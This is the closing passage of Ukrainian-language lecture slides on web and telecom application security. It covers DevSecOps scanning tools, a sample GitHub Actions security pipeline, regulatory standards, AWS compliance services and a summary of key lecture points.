| SCA | Trivy, Snyk, OWASP Dependency-Check | Залежності та CVE |
| DAST | OWASP ZAP, Burp Suite | Динамічний аналіз |
| IaC Security | Checkov, tfsec, Terrascan | Terraform/CloudFormation |
| Container | Trivy, Grype, ECR Inspector | Образи Docker |
| Secrets | GitLeaks, truffleHog, AWS Secrets Manager | Виявлення секретів у коді |

## Pipeline приклад (GitHub Actions)

```yaml
jobs:
  security:
    steps:
      - uses: actions/checkout@v4
      - name: SAST scan
        uses: returntocorp/semgrep-action@v1
      - name: Dependency scan
        run: trivy fs --exit-code 1 --severity HIGH,CRITICAL .
      - name: IaC scan
        run: checkov -d terraform/ --compact
```

---

# Відповідність та регуляторні вимоги

## Регуляторна база для веб- та телеком-застосунків

| Стандарт | Область | Ключові вимоги |
|----------|---------|----------------|
| **GDPR** | Персональні дані EU | Мінімізація даних, право на видалення, DPA |
| **PCI DSS v4.0** | Платіжні картки | Req. 6 (Secure Apps), Req. 11 (Testing) |
| **ISO 27001:2022** | ISMS | A.14 (System Dev), A.8 (Asset Mgmt) |
| **ETSI TS 102 165** | Телеком безпека | TVRA методологія |
| **3GPP TS 33.xxx** | Мобільні мережі | AKA, NDS/IP, 5G Security |
| **GSMA FS.xx** | Оператори | SS7, Diameter, Cloud security |
| **NIS2 Directive** | Критична інфраструктура | EU мережева безпека |

## AWS Compliance для телекому

| Сервіс | Допомагає з |
|--------|-------------|
| **AWS Artifact** | Завантаження звітів відповідності (SOC 2, PCI DSS) |
| **AWS Config** | Безперервна перевірка конфігурацій |
| **Security Hub** | Агрегація знахідок (FSBP, CIS, PCI DSS) |
| **GuardDuty** | Виявлення загроз у реальному часі |
| **AWS Audit Manager** | Автоматизація збору доказів аудиту |

---

# Підсумок лекції

## Ключові висновки

### 🌐 Безпека веб-застосунків (30%)
- **OWASP Top 10** — фундаментальний каталог вразливостей
- **SQLi, XSS, CSRF, SSRF, IDOR** — найпоширеніші вектори атак
- **WAF + HTTPS/TLS 1.3 + OAuth 2.0** — базовий стек захисту

### 📡 Безпека телекомунікаційних застосунків (55%)
- **SS7 та Diameter** — legacy-протоколи з критичними вразливостями
- **VoIP/SIP, SMS, GTP** — специфічні вектори атак в телекомі
- **5G SBA** — нова архітектура, нові ризики (SUCI, rogue AMF)
- **Telecom APIs** — ризики відкритих мережевих можливостей

### ☁️ Хмара та DevSecOps (15%)
- **AWS WAF + Shield + CloudFront** — комплексний захист
- **Shift Left** — безпека інтегрована в CI/CD pipeline

## ❓ Питання

> **Якщо 2FA через SMS вже небезпечна, які альтернативи є практичними для масового застосування в телекомі?**

- Лекція 8: Моніторинг, логування та виявлення загроз
- Лекція 9: Реагування на інциденти та форензика

---
*Лекція 7 | Безпека веб- та телеком-застосунків | Курс: ІБ телекомунікаційних та хмарних технологій*
